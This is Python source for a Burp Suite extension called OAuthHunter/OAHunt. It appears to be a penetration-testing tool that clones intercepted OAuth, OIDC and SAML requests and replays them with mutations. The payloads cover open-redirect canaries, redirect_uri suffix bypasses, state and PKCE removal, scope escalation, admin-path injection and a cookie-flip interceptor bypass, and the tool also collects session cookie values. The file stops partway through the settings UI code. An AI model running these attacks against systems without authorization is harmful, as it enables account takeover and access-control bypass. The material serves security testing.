# -*- coding: utf-8 -*-
"""
OAuthHunter v3.0 - OAuth/OIDC/SAML Exploit Confirmer
Burp Suite Extension - Jython 2.7

DESIGN (like Authorize extension):
  - Browser proxy flow passes through 100% UNTOUCHED - no restarts, no interference
  - Extension clones every OAuth/SAML request into a background queue
  - Each clone is mutated with attack payloads and sent as a SEPARATE request
    via callbacks.makeHttpRequest() - completely independent of browser session
  - Response is evaluated for exploitation proof
  - Only CONFIRMED exploits appear in the findings table
  - Zero false positives, zero browser disruption

Install: Extender > Extensions > Add > Type: Python > Jython 2.7
"""

from burp import IBurpExtender, IHttpListener, ITab, IExtensionStateListener
from javax.swing import (JPanel, JTabbedPane, JTable, JScrollPane, JButton,
                          JTextArea, JLabel, JSplitPane, JTextField,
                          BorderFactory, SwingUtilities, JOptionPane,
                          BoxLayout, SwingConstants, JCheckBox, JToggleButton,
                          JPopupMenu, JMenuItem)
from javax.swing.table import DefaultTableModel, DefaultTableCellRenderer
from java.awt import (Color, Font, Dimension, BorderLayout, GridBagLayout,
                       GridBagConstraints, Insets, FlowLayout)
from java.awt.event import ActionListener, MouseAdapter, MouseEvent
from java.lang import Runnable
from java.util.concurrent import LinkedBlockingQueue, ThreadPoolExecutor, TimeUnit

import json
import base64
import time

# ── Colours ──────────────────────────────────
C_BG      = Color(13,  17,  23)
C_SURFACE = Color(22,  27,  34)
C_BORDER  = Color(48,  54,  61)
C_ACCENT  = Color(88,  166, 255)
C_RED     = Color(248, 81,  73)
C_GREEN   = Color(63,  185, 80)
C_YELLOW  = Color(210, 153, 34)
C_TEXT    = Color(201, 209, 217)
C_MUTED   = Color(110, 118, 129)
C_ORANGE  = Color(230, 120, 40)

SEVERITY_COLORS = {
    "CRITICAL": Color(255, 50,  50),
    "HIGH":     Color(240, 100, 40),
    "MEDIUM":   Color(210, 153, 34),
    "LOW":      Color(63,  185, 80),
    "INFO":     Color(88,  166, 255),
}

# ── Detection triggers ────────────────────────
OAUTH_PARAMS = set([
    "response_type", "client_id", "redirect_uri", "scope", "state",
    "code", "access_token", "id_token", "grant_type", "code_verifier",
    "code_challenge", "nonce", "prompt", "RelayState", "SAMLResponse",
    "SAMLRequest", "returnTo", "return_to", "next", "redirect", "goto",
    "wresult", "wctx", "wa",
])

OAUTH_PATHS = [
    "/authorize", "/oauth/authorize", "/oauth2/authorize",
    "/login/callback", "/auth/callback", "/oauth/callback",
    "/saml/acs", "/saml2/acs", "/sso/saml", "/token",
    "/userinfo", "/authorize/resume", "/conversion/interceptor",
    "/usernamepassword/login",
]

REDIRECT_PARAMS = [
    "redirect_uri", "returnTo", "return_to", "next", "redirect",
    "goto", "continue", "url", "target", "dest", "postLogin",
    "landingPage", "after_login", "callback", "redirect_url",
]

CANARY = "oauthhunter-canary.example.com"


# ─────────────────────────────────────────────
# REQUEST CLONER
# Clones a captured request into an independent
# IHttpRequestResponse-compatible object for
# makeHttpRequest — browser never sees this.
# ─────────────────────────────────────────────
class ClonedRequest(object):
    def __init__(self, helpers, original_msg):
        self._service = original_msg.getHttpService()
        self._request = original_msg.getRequest()[:]   # byte[] copy
        self._helpers = helpers

    def getHttpService(self):
        return self._service

    def getRequest(self):
        return self._request

    def set_request(self, new_bytes):
        self._request = new_bytes

    def get_analyzed(self):
        return self._helpers.analyzeRequest(self._service, self._request)


# ─────────────────────────────────────────────
# ATTACK JOBS
# Each job = one cloned request + one mutation
# Runs in thread pool, never blocks proxy thread
# ─────────────────────────────────────────────

class AttackJob(Runnable):
    """Base class for all attack jobs."""

    def __init__(self, ext, original_msg, param_map, host, path):
        self.ext       = ext
        self.original  = original_msg
        self.param_map = param_map
        self.host      = host
        self.path      = path

    def run(self):
        try:
            self.execute()
        except Exception as ex:
            self.ext._log("Job error [{}]: {}".format(
                self.__class__.__name__, str(ex)))

    def execute(self):
        pass  # override in subclasses

    def clone(self):
        """Return a fresh independent clone of the original request."""
        return ClonedRequest(self.ext._helpers, self.original)

    def send(self, cloned):
        """Send the cloned (mutated) request independently."""
        return self.ext._callbacks.makeHttpRequest(
            cloned.getHttpService(), cloned.getRequest())

    def get_location(self, resp_bytes):
        ar = self.ext._helpers.analyzeResponse(resp_bytes)
        for h in ar.getHeaders():
            if str(h).lower().startswith("location:"):
                return str(h)[9:].strip()
        return ""

    def get_status(self, resp_bytes):
        return self.ext._helpers.analyzeResponse(resp_bytes).getStatusCode()

    def get_body(self, resp_bytes, limit=800):
        try:
            return self.ext._helpers.bytesToString(resp_bytes)[:limit]
        except Exception:
            return ""

    def update_param(self, cloned, name, value, ptype=None):
        h      = self.ext._helpers
        req    = cloned.getRequest()
        params = h.analyzeRequest(cloned.getHttpService(), req).getParameters()
        for p in params:
            if str(p.getName()) == name:
                req = h.updateParameter(
                    req, h.buildParameter(name, value, p.getType()))
                cloned.set_request(req)
                return True
        # Not found — add as query param (type 0)
        req = h.addParameter(req, h.buildParameter(name, value, 0))
        cloned.set_request(req)
        return False

    def remove_param(self, cloned, name):
        h      = self.ext._helpers
        req    = cloned.getRequest()
        params = h.analyzeRequest(cloned.getHttpService(), req).getParameters()
        for p in params:
            if str(p.getName()) == name:
                req = h.removeParameter(req, p)
                cloned.set_request(req)
                return True
        return False

    def report(self, name, severity, cwe, evidence):
        self.ext._add_finding(
            self.host, self.path, self.original,
            name, severity, cwe, evidence)


# ── Individual attack job classes ─────────────

class JobOpenRedirect(AttackJob):
    """
    Clone request, replace redirect param with CANARY domain.
    Confirmed if Location header contains CANARY (server followed it).
    Browser request passes through unchanged.
    """
    def __init__(self, ext, original_msg, param_map, host, path, param_name):
        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
        self.param_name = param_name

    def execute(self):
        payloads = [
            "https://" + CANARY,
            "//" + CANARY,
            "https://" + CANARY + "%40" + self.host,
        ]
        for payload in payloads:
            c = self.clone()
            self.update_param(c, self.param_name, payload)
            resp = self.send(c)
            if resp and resp.getResponse():
                loc    = self.get_location(resp.getResponse())
                status = self.get_status(resp.getResponse())
                if status in (301, 302, 303, 307, 308):
                    if (CANARY in loc or
                            (loc.startswith("http") and
                             self.host not in loc and
                             "error" not in loc.lower())):
                        self.report(
                            "Open Redirect via '{}'".format(self.param_name),
                            "HIGH", "CWE-601",
                            "Cloned request with {}={}\n"
                            "Server returned {} Location: {}".format(
                                self.param_name, payload, status, loc[:120]))
                        return


class JobPrefixBypass(AttackJob):
    """
    Append query params / path traversal to whitelisted redirect_uri.
    Confirmed if server accepts the modified URI (no error, or canary in Location).
    """
    def __init__(self, ext, original_msg, param_map, host, path, orig_redir):
        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
        self.orig_redir = orig_redir

    def execute(self):
        suffixes = [
            "?next=https://"    + CANARY,
            "?returnTo=https://" + CANARY,
            "?redirect=https://" + CANARY,
            "%3Fnext%3Dhttps%3A%2F%2F" + CANARY,
            "#https://" + CANARY,
            "/../../../evil",
            "%2f..%2f..%2fevil",
        ]
        for suffix in suffixes:
            payload = self.orig_redir + suffix
            c = self.clone()
            self.update_param(c, "redirect_uri", payload)
            resp = self.send(c)
            if resp and resp.getResponse():
                loc    = self.get_location(resp.getResponse())
                status = self.get_status(resp.getResponse())
                body   = self.get_body(resp.getResponse())

                # Confirmed: prefix match accepted, no error
                if status in (301, 302, 303) and "error" not in loc.lower():
                    if CANARY in loc or "code=" in loc:
                        self.report(
                            "redirect_uri Prefix Match Bypass",
                            "HIGH", "CWE-183",
                            "Suffix '{}' appended to redirect_uri was accepted.\n"
                            "Status: {} Location: {}".format(
                                suffix, status, loc[:120]))
                        return

                # Also report if error reveals the modified URI was attempted
                if ("error_description" in body and
                        (CANARY in body or "not in the list" in body)):
                    self.report(
                        "redirect_uri Prefix Match Bypass (Partial)",
                        "MEDIUM", "CWE-183",
                        "Server attempted redirect to modified URI.\n"
                        "error_description reveals: {}".format(
                            body[body.find("error_description"):
                                 body.find("error_description") + 200]))
                    return


class JobStateCsrf(AttackJob):
    """
    Remove state param from cloned request.
    Confirmed if server still issues code/token (CSRF is possible).
    """
    def execute(self):
        if "state" not in self.param_map:
            return
        c = self.clone()
        self.remove_param(c, "state")
        resp = self.send(c)
        if resp and resp.getResponse():
            loc    = self.get_location(resp.getResponse())
            status = self.get_status(resp.getResponse())
            if status in (200, 301, 302) and "error" not in loc.lower():
                if "code=" in loc or "token=" in loc or status == 200:
                    self.report(
                        "Missing State — CSRF Login Attack Confirmed",
                        "HIGH", "CWE-352",
                        "Cloned request sent WITHOUT state param.\n"
                        "Server accepted it. Status: {} Location: {}".format(
                            status, loc[:100]))


class JobPkceMissing(AttackJob):
    """
    Strip code_challenge from cloned code-flow request.
    Confirmed if server still returns auth code.
    """
    def execute(self):
        if self.param_map.get("response_type") != "code":
            return
        if "code_challenge" not in self.param_map:
            return  # wasn't using PKCE to begin with
        c = self.clone()
        self.remove_param(c, "code_challenge")
        self.remove_param(c, "code_challenge_method")
        resp = self.send(c)
        if resp and resp.getResponse():
            loc    = self.get_location(resp.getResponse())
            status = self.get_status(resp.getResponse())
            if status in (301, 302) and "code=" in loc and "error" not in loc.lower():
                self.report(
                    "PKCE Bypass — Auth Code Issued Without Verifier",
                    "MEDIUM", "CWE-345",
                    "Cloned request stripped code_challenge.\n"
                    "Server still returned code. Location: {}".format(loc[:120]))


class JobScopeEscalation(AttackJob):
    """
    Replace scope with elevated values in clone.
    Confirmed if server grants elevated scope without error.
    """
    def execute(self):
        if "scope" not in self.param_map:
            return
        orig = self.param_map["scope"]
        tests = [
            orig + " admin",
            orig + " offline_access",
            "openid profile email admin",
            "admin",
        ]
        for scope in tests:
            c = self.clone()
            self.update_param(c, "scope", scope)
            resp = self.send(c)
            if resp and resp.getResponse():
                loc    = self.get_location(resp.getResponse())
                status = self.get_status(resp.getResponse())
                body   = self.get_body(resp.getResponse())
                if status in (200, 302) and "error" not in loc.lower():
                    if "code=" in loc or "access_token" in body:
                        self.report(
                            "OAuth Scope Escalation Confirmed",
                            "HIGH", "CWE-269",
                            "Cloned request with scope='{}' accepted.\n"
                            "Status: {} Location: {}".format(
                                scope, status, loc[:100]))
                        return


class JobRedirectParamInjection(AttackJob):
    """
    Inject internal paths into post-auth redirect params.
    Confirmed if server 302s to the injected path.
    """
    def __init__(self, ext, original_msg, param_map, host, path, param_name):
        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
        self.param_name = param_name

    def execute(self):
        for dest in ["/admin", "/admin/users", "/manage", "/config",
                     "https://" + CANARY]:
            c = self.clone()
            self.update_param(c, self.param_name, dest)
            resp = self.send(c)
            if resp and resp.getResponse():
                loc    = self.get_location(resp.getResponse())
                status = self.get_status(resp.getResponse())
                if status in (301, 302, 303) and dest in loc:
                    self.report(
                        "Post-Auth Redirect Injection via '{}'".format(
                            self.param_name),
                        "HIGH", "CWE-601",
                        "Cloned request with {}={}\n"
                        "Server redirected to: {}".format(
                            self.param_name, dest, loc[:120]))
                    return
                if status == 200 and dest == "/admin":
                    body = self.get_body(resp.getResponse())
                    if "admin" in body.lower():
                        self.report(
                            "Post-Auth Redirect Injection via '{}'".format(
                                self.param_name),
                            "HIGH", "CWE-601",
                            "Cloned request with {}={} returned 200 with admin content.".format(
                                self.param_name, dest))
                        return


class JobG2gBypass(AttackJob):
    """
    Clone a request to a protected page, flip g2g/eg2g cookies to false.
    Confirmed if 200 returned without intercept page.
    Completely independent of browser — browser still has g2g=true.
    """
    def __init__(self, ext, original_msg, param_map, host, path, cookies):
        AttackJob.__init__(self, ext, original_msg, param_map, host, path)
        self.cookies = cookies

    def execute(self):
        if not any(k.lower() in ("g2g", "eg2g")
                   for k in self.cookies.keys()):
            return

        test_paths = ["/en/dashboard.html", "/en/profile/manage",
                      "/dombff-profile/profile", "/en/admin"]

        for tpath in test_paths:
            for g2g_val in ["false", "0", ""]:
                h = self.ext._helpers

                # Build cookie string with flipped g2g
                cookie_parts = []
                for name, val in self.cookies.items():
                    if name.lower() == "g2g":
                        cookie_parts.append("g2g=" + g2g_val)
                    elif name.lower() == "eg2g":
                        cookie_parts.append("eg2g=" + g2g_val)
                    else:
                        cookie_parts.append("{}={}".format(name, val))

                raw = ("GET {} HTTP/1.1\r\n"
                       "Host: {}\r\n"
                       "Cookie: {}\r\n"
                       "User-Agent: Mozilla/5.0 OAuthHunter\r\n"
                       "Accept: text/html,*/*\r\n"
                       "Connection: close\r\n\r\n").format(
                    tpath, self.host, "; ".join(cookie_parts))

                try:
                    resp = self.ext._callbacks.makeHttpRequest(
                        self.original.getHttpService(),
                        h.stringToBytes(raw))
                    if resp and resp.getResponse():
                        loc    = self.get_location(resp.getResponse())
                        status = self.get_status(resp.getResponse())
                        body   = self.get_body(resp.getResponse())

                        if status == 200 and "intercept" not in body.lower():
                            self.report(
                                "Post-Login Interceptor (g2g) Bypass Confirmed",
                                "CRITICAL", "CWE-284",
                                "Cloned request to {} with g2g={}\n"
                                "Server returned 200 WITHOUT intercept page.\n"
                                "Browser session was NOT affected.".format(
                                    tpath, g2g_val))
                            return
                        if (status in (301, 302) and
                                "intercept" not in loc.lower()):
                            self.report(
                                "Post-Login Interceptor (g2g) Bypass Confirmed",
                                "CRITICAL", "CWE-284",
                                "Cloned request to {} with g2g={}\n"
                                "Redirected to {} (not intercept page).".format(
                                    tpath, g2g_val, loc[:80]))
                            return
                except Exception:
                    pass


class JobSamlRelayState(AttackJob):
    """
    Replace RelayState with CANARY in clone.
    Confirmed if Location contains CANARY.
    """
    def execute(self):
        if "RelayState" not in self.param_map:
            return
        for payload in ["https://" + CANARY, "//" + CANARY, "/admin"]:
            c = self.clone()
            self.update_param(c, "RelayState", payload)
            resp = self.send(c)
            if resp and resp.getResponse():
                loc    = self.get_location(resp.getResponse())
                status = self.get_status(resp.getResponse())
                if (CANARY in loc or "/admin" in loc or
                        (status in (301, 302) and payload in loc)):
                    self.report(
                        "SAML RelayState Open Redirect Confirmed",
                        "HIGH", "CWE-601",
                        "Cloned RelayState={}\n"
                        "Server redirected to: {}".format(payload, loc[:120]))
                    return


class JobCookieFlags(object):
    """
    Not a proxy job — called directly from response handler.
    Checks ONLY critical auth cookies for missing flags.
    Certain finding, no HTTP request needed.
    """
    CRITICAL_COOKIES = set([
        "auth0", "auth0_compat", "access_token", "id_token",
        "session", "sid", "token",
    ])

    @staticmethod
    def check(cookie_header):
        if not cookie_header.lower().startswith("set-cookie:"):
            return None, None
        parts = cookie_header[11:].strip()
        name  = parts.split("=")[0].strip().lower()
        low   = parts.lower()
        if name not in JobCookieFlags.CRITICAL_COOKIES:
            return None, None
        missing = []
        if "httponly" not in low: missing.append("HttpOnly")
        if "secure"   not in low: missing.append("Secure")
        if "samesite" not in low: missing.append("SameSite")
        if missing:
            return (
                "Auth Cookie '{}' Missing: {}".format(name, ", ".join(missing)),
                "Cookie '{}' confirmed missing flags: {}".format(
                    name, ", ".join(missing))
            )
        return None, None


# ── Non-editable table model ──────────────────
class ReadOnlyTableModel(DefaultTableModel):
    def isCellEditable(self, row, col):
        return False


# ── Cell renderer ─────────────────────────────
class SeverityRenderer(DefaultTableCellRenderer):
    def getTableCellRendererComponent(self, table, value, isSelected,
                                       hasFocus, row, col):
        c = DefaultTableCellRenderer.getTableCellRendererComponent(
            self, table, value, isSelected, hasFocus, row, col)
        if col == 2:
            self.setForeground(SEVERITY_COLORS.get(str(value), C_TEXT))
            self.setFont(Font("Monospaced", Font.BOLD, 11))
        else:
            self.setForeground(C_TEXT)
            self.setFont(Font("Monospaced", Font.PLAIN, 11))
        self.setBackground(C_SURFACE if not isSelected else C_ACCENT.darker())
        return c


# ── Runnable UI helpers ───────────────────────
class AddFindingRow(Runnable):
    def __init__(self, ext, finding):
        self.ext     = ext
        self.finding = finding

    def run(self):
        f = self.finding
        self.ext._findings_model.addRow([
            f["timestamp"], f["host"], f["severity"],
            f["name"], f["path"][:60], f["cwe"]
        ])
        # Flash findings tab title
        try:
            count = len(self.ext.all_findings)
            self.ext._tabs.setTitleAt(
                0, "Findings ({})".format(count))
        except Exception:
            pass


class AppendLog(Runnable):
    def __init__(self, ext, line):
        self.ext  = ext
        self.line = line

    def run(self):
        try:
            a = self.ext._log_area
            a.append(self.line)
            a.setCaretPosition(a.getDocument().getLength())
        except Exception:
            pass


class IncrementCounter(Runnable):
    def __init__(self, ext):
        self.ext = ext

    def run(self):
        try:
            self.ext._scan_count += 1
            self.ext._counter_lbl.setText(
                "  Requests scanned: {}  |  Findings: {}  |  Queue: {}".format(
                    self.ext._scan_count,
                    len(self.ext.all_findings),
                    self.ext._queue.size() if self.ext._queue else 0))
        except Exception:
            pass


# ── Action listeners ──────────────────────────
class ToggleAction(ActionListener):
    def __init__(self, ext, btn):
        self.ext = ext
        self.btn = btn

    def actionPerformed(self, evt):
        self.ext._active = self.btn.isSelected()
        if self.ext._active:
            self.btn.setText("ON  - Click to Disable")
            self.btn.setForeground(C_GREEN)
            self.ext._status_lbl.setText("Status: ACTIVE — scanning OAuth flows")
            self.ext._status_lbl.setForeground(C_GREEN)
        else:
            self.btn.setText("OFF - Click to Enable")
            self.btn.setForeground(C_MUTED)
            self.ext._status_lbl.setText("Status: PAUSED")
            self.ext._status_lbl.setForeground(C_MUTED)


class ClearAction(ActionListener):
    def __init__(self, ext):
        self.ext = ext

    def actionPerformed(self, evt):
        e = self.ext
        e.all_findings = []
        e.tested.clear()
        e._scan_count = 0
        e._findings_model.setRowCount(0)
        try:
            e._tabs.setTitleAt(0, "Findings (0)")
        except Exception:
            pass
        e._log("Cleared.")


class ExportAction(ActionListener):
    def __init__(self, ext):
        self.ext = ext

    def actionPerformed(self, evt):
        try:
            data = [{k: v for k, v in f.items() if k != "messageInfo"}
                    for f in self.ext.all_findings]
            path = "/tmp/oauthhunter_confirmed.json"
            with open(path, "w") as fp:
                json.dump(data, fp, indent=2, default=str)
            self.ext._log("Exported {} findings to {}".format(len(data), path))
            JOptionPane.showMessageDialog(
                None, "Saved: " + path, "Export OK",
                JOptionPane.INFORMATION_MESSAGE)
        except Exception as ex:
            self.ext._log("Export error: " + str(ex))


class SaveSettingsAction(ActionListener):
    def __init__(self, ext, scope_field, threads_field):
        self.ext          = ext
        self.scope_field  = scope_field
        self.threads_field = threads_field

    def actionPerformed(self, evt):
        self.ext.scope_filter = [s.strip() for s in
                                  self.scope_field.getText().split(",")
                                  if s.strip()]
        try:
            t = int(self.threads_field.getText().strip())
            if 1 <= t <= 20:
                self.ext._pool_size = t
        except Exception:
            pass
        self.ext._log("Settings saved. Scope: {} Threads: {}".format(
            self.ext.scope_filter, self.ext._pool_size))


class FindingSelectListener(MouseAdapter):
    def __init__(self, ext, table, detail):
        self.ext    = ext
        self.table  = table
        self.detail = detail

    def mouseClicked(self, evt):
        row = self.table.getSelectedRow()
        if 0 <= row < len(self.ext.all_findings):
            f = self.ext.all_findings[row]
            self.detail.setText(
                "CONFIRMED VULNERABILITY\n"
                + "=" * 55 + "\n"
                "Name:        {}\n"
                "Severity:    {}\n"
                "CWE:         {}\n"
                "Host:        {}\n"
                "Path:        {}\n"
                "Time:        {}\n\n"
                "PROOF OF EXPLOIT:\n"
                "{}\n\n"
                "NOTE: The confirmation request was sent as an\n"
                "independent clone. Your browser session was\n"
                "completely unaffected.\n"
            ).format(
                f["name"], f["severity"], f["cwe"],
                f["host"], f["path"], f["timestamp"],
                f["evidence"]
            )
            self.detail.setCaretPosition(0)


class ClearLogAction(ActionListener):
    def __init__(self, area):
        self.area = area

    def actionPerformed(self, evt):
        self.area.setText("")


# ── Main extension ────────────────────────────
class BurpExtender(IBurpExtender, IHttpListener, ITab, IExtensionStateListener):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks   = callbacks
        self._helpers     = callbacks.getHelpers()
        callbacks.setExtensionName("OAHunt")
        callbacks.registerHttpListener(self)
        callbacks.registerExtensionStateListener(self)

        self.all_findings    = []
        self.tested          = set()
        self.session_cookies = {}   # host -> {name: value}
        self._active         = True
        self.scope_filter    = []
        self._scan_count     = 0
        self._pool_size      = 4
        self._queue          = None

        # Thread pool — background attack jobs never touch proxy thread
        self._executor = ThreadPoolExecutor(self._pool_size,
                                             self._pool_size * 4,
                                             60, TimeUnit.SECONDS,
                                             LinkedBlockingQueue())

        SwingUtilities.invokeLater(BuildUI(self))
        callbacks.addSuiteTab(self)
        print("[OAHunt] Loaded. Browser flow unaffected. Cloning OAuth requests.")

    def getTabCaption(self):
        return "OAHunt"

    def getUiComponent(self):
        return self._main_panel

    def extensionUnloaded(self):
        try:
            self._executor.shutdownNow()
        except Exception:
            pass
        print("[OAHunt] Unloaded.")

    # ─────────────────────────────────────────
    # HTTP LISTENER
    # CRITICAL: this method must return FAST.
    # We only read the request, queue jobs, and return.
    # The browser never waits for our attack jobs.
    # ─────────────────────────────────────────
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if not self._active:
            return
        try:
            if messageIsRequest:
                self._queue_attack_jobs(messageInfo)
            else:
                self._harvest_cookies(messageInfo)
        except Exception:
            pass
        # Always return immediately — never block the proxy thread

    def _queue_attack_jobs(self, msg):
        analyzed = self._helpers.analyzeRequest(msg)
        url      = analyzed.getUrl()
        host     = str(url.getHost())
        path     = str(url.getPath())
        params   = analyzed.getParameters()

        # Scope filter
        if self.scope_filter:
            if not any(h in host for h in self.scope_filter):
                return

        # Only process OAuth/SAML traffic
        param_map = {}
        for p in params:
            param_map[str(p.getName())] = str(p.getValue())

        is_oauth = (any(k in param_map for k in OAUTH_PARAMS) or
                    any(seg in path for seg in OAUTH_PATHS))
        if not is_oauth:
            return

        SwingUtilities.invokeLater(IncrementCounter(self))
        self._log("Cloning: {} {}".format(str(analyzed.getMethod()), path))

        cookies = dict(self.session_cookies.get(host, {}))

        # Queue all applicable jobs — each runs independently in thread pool
        # The original msg bytes are copied into each ClonedRequest

        # 1. Open redirect on every redirect-like param
        for rp in REDIRECT_PARAMS:
            if rp in param_map:
                key = "or:{}:{}:{}".format(host, path, rp)
                if key not in self.tested:
                    self.tested.add(key)
                    self._submit(JobOpenRedirect(
                        self, msg, param_map, host, path, rp))

        # 2. Prefix bypass
        if "redirect_uri" in param_map:
            key = "pb:{}:{}".format(host, path)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobPrefixBypass(
                    self, msg, param_map, host, path,
                    param_map["redirect_uri"]))

        # 3. State CSRF
        if "response_type" in param_map and "state" in param_map:
            key = "csrf:{}:{}".format(host, path)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobStateCsrf(
                    self, msg, param_map, host, path))

        # 4. PKCE bypass
        if (param_map.get("response_type") == "code" and
                "code_challenge" in param_map):
            key = "pkce:{}:{}".format(host, path)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobPkceMissing(
                    self, msg, param_map, host, path))

        # 5. Scope escalation
        if "scope" in param_map and "response_type" in param_map:
            key = "scope:{}:{}".format(host, path)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobScopeEscalation(
                    self, msg, param_map, host, path))

        # 6. Post-auth redirect param injection
        for rp in ["returnTo", "return_to", "next", "goto",
                   "postLogin", "landingPage", "after_login"]:
            if rp in param_map:
                key = "ri:{}:{}:{}".format(host, path, rp)
                if key not in self.tested:
                    self.tested.add(key)
                    self._submit(JobRedirectParamInjection(
                        self, msg, param_map, host, path, rp))

        # 7. g2g bypass (when interceptor-style path seen with g2g cookies)
        if (cookies and
                any(k.lower() in ("g2g", "eg2g") for k in cookies.keys())):
            key = "g2g:{}".format(host)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobG2gBypass(
                    self, msg, param_map, host, path, cookies))

        # 8. SAML RelayState
        if "RelayState" in param_map:
            key = "rs:{}:{}".format(host, path)
            if key not in self.tested:
                self.tested.add(key)
                self._submit(JobSamlRelayState(
                    self, msg, param_map, host, path))

    def _harvest_cookies(self, msg):
        """
        Read Set-Cookie headers from responses to track session state.
        Also check critical auth cookie flags here.
        """
        analyzed_req  = self._helpers.analyzeRequest(msg)
        analyzed_resp = self._helpers.analyzeResponse(msg.getResponse())
        host  = str(analyzed_req.getUrl().getHost())
        path  = str(analyzed_req.getUrl().getPath())

        if self.scope_filter:
            if not any(h in host for h in self.scope_filter):
                return

        for h in analyzed_resp.getHeaders():
            hs = str(h)
            if hs.lower().startswith("set-cookie:"):
                # Harvest cookie value
                parts = hs[11:].strip()
                if "=" in parts:
                    name = parts.split("=")[0].strip()
                    val  = parts.split("=")[1].split(";")[0].strip()
                    if host not in self.session_cookies:
                        self.session_cookies[host] = {}
                    self.session_cookies[host][name] = val

                # Check critical cookie flags (no HTTP request needed)
                name_str, evidence = JobCookieFlags.check(hs)
                if name_str:
                    key = "cf:{}:{}".format(host, name_str)
                    if key not in self.tested:
                        self.tested.add(key)
                        self._add_finding(host, path, msg,
                            name_str, "LOW", "CWE-614", evidence)

    def _submit(self, job):
        try:
            self._executor.execute(job)
        except Exception as ex:
            self._log("Submit error: " + str(ex))

    def _add_finding(self, host, path, msg, name, severity, cwe, evidence):
        # Deduplicate by name+host+path
        for f in self.all_findings:
            if (f["name"] == name and
                    f["host"] == host and
                    f["path"] == path):
                return
        finding = {
            "host":        host,
            "path":        path,
            "name":        name,
            "severity":    severity,
            "cwe":         cwe,
            "evidence":    evidence,
            "timestamp":   time.strftime("%H:%M:%S"),
            "messageInfo": msg,
        }
        self.all_findings.append(finding)
        self._log("[CONFIRMED][{}] {} on {}{}".format(
            severity, name, host, path))
        SwingUtilities.invokeLater(AddFindingRow(self, finding))

    def _log(self, msg):
        line = "[{}] {}\n".format(time.strftime("%H:%M:%S"), str(msg))
        SwingUtilities.invokeLater(AppendLog(self, line))


# ── UI ────────────────────────────────────────
class BuildUI(Runnable):
    def __init__(self, ext):
        self.ext = ext

    def run(self):
        e    = self.ext
        main = JPanel(BorderLayout())
        main.setBackground(C_BG)
        e._main_panel = main

        tabs = JTabbedPane()
        tabs.setBackground(C_SURFACE)
        tabs.setForeground(C_TEXT)
        tabs.setFont(Font("Monospaced", Font.BOLD, 12))
        e._tabs = tabs

        tabs.addTab("Findings (0)", self._findings_tab())
        tabs.addTab("Settings",     self._settings_tab())
        tabs.addTab("Log",          self._log_tab())

        main.add(self._header(), BorderLayout.NORTH)
        main.add(tabs,           BorderLayout.CENTER)

    def _header(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_SURFACE)
        p.setBorder(BorderFactory.createMatteBorder(0, 0, 2, 0, C_ACCENT))

        left = JPanel(FlowLayout(FlowLayout.LEFT, 10, 6))
        left.setBackground(C_SURFACE)

        title = JLabel("OAHunt")
        title.setFont(Font("Monospaced", Font.BOLD, 14))
        title.setForeground(C_ACCENT)

        # Big toggle button — like Authorize extension
        toggle = JToggleButton("ON  - Click to Disable", True)
        toggle.setFont(Font("Monospaced", Font.BOLD, 12))
        toggle.setBackground(C_SURFACE)
        toggle.setForeground(C_GREEN)
        toggle.setFocusPainted(False)
        toggle.addActionListener(ToggleAction(e, toggle))

        status_lbl = JLabel("Status: ACTIVE — cloning OAuth flows")
        status_lbl.setFont(Font("Monospaced", Font.PLAIN, 11))
        status_lbl.setForeground(C_GREEN)
        e._status_lbl = status_lbl

        left.add(title)
        left.add(toggle)
        left.add(status_lbl)

        right = JPanel(FlowLayout(FlowLayout.RIGHT, 6, 6))
        right.setBackground(C_SURFACE)

        counter_lbl = JLabel(
            "  Requests scanned: 0  |  Findings: 0  |  Queue: 0")
        counter_lbl.setFont(Font("Monospaced", Font.PLAIN, 10))
        counter_lbl.setForeground(C_MUTED)
        e._counter_lbl = counter_lbl

        clear_btn  = self._btn("Clear",  C_MUTED)
        export_btn = self._btn("Export", C_GREEN)
        clear_btn.addActionListener(ClearAction(e))
        export_btn.addActionListener(ExportAction(e))

        right.add(counter_lbl)
        right.add(clear_btn)
        right.add(export_btn)

        p.add(left,  BorderLayout.WEST)
        p.add(right, BorderLayout.EAST)
        return p

    def _findings_tab(self):
        e = self.ext
        p = JPanel(BorderLayout())
        p.setBackground(C_BG)

        cols  = ["Time", "Host", "Severity", "Vulnerability", "Path", "CWE"]
        model = ReadOnlyTableModel(cols, 0)
        e._findings_model = model

        table = self._table(model)
        sev_r = SeverityRenderer()
        for i in range(len(cols)):
            table.getColumnModel().getColumn(i).setCellRenderer(sev_r)
        for i, w in enumerate([65, 170, 80, 300, 200, 80]):
            table.getColumnModel().getColumn(i).setPreferredWidth(w)

        detail = self._textarea()
        detail.setText(
            "Select a finding above to see the exploit proof.\n\n"
            "Every finding was confirmed by sending an independent cloned\n"
            "request. Your browser session was never touched."
        )
        table.addMouseListener(FindingSelectListener(e, table, detail))

        banner = JLabel(
            "  All findings confirmed via independent cloned requests  "
            "|  Browser/proxy flow is NEVER modified")
        banner.setFont(Font("Monospaced", Font.BOLD, 11))
        banner.setForeground(C_GREEN)

        split = JSplitPane(JSplitPane.VERTICAL_SPLIT,
                           JScrollPane(table), JScrollPane(detail))
        split.setResizeWeight(0.6)
        split.setBackground(C_BG)

        p.add(banner, BorderLayout.NORTH)
        p.add(split,  BorderLayout.CENTER)
        return p

    def _settings_tab(self):
        e = self.ext
        p = JPanel(GridBagLayout())
        p.setBackground(C_BG)
        gbc        = GridBagConstraints()
        gbc.insets = Insets(10, 14, 10, 14)
        gbc.fill   = GridBagConstraints.HORIZONTAL

        scope_field = JTextField("", 40)
        scope_field.setBackground(C_SURFACE)
        scope_field.setForeground(C_TEXT)
        scope_field.setFont(Font("Monospaced", Font.PLAIN, 11))
        scope_field.setToolTipText(
            "Leave blank for all hosts. E.g.: airmiles.ca,oauth-int.airmiles.ca")

        threads_field = JTextField("4", 10)
        threads_field.setBackground(C_SURFACE)
        threads_field.setForeground(C_TEXT)
        threads_field.setFont(Font("Monospaced", Font.PLAIN, 11))

        save_btn = self._btn("Save Settings", C_GREEN)
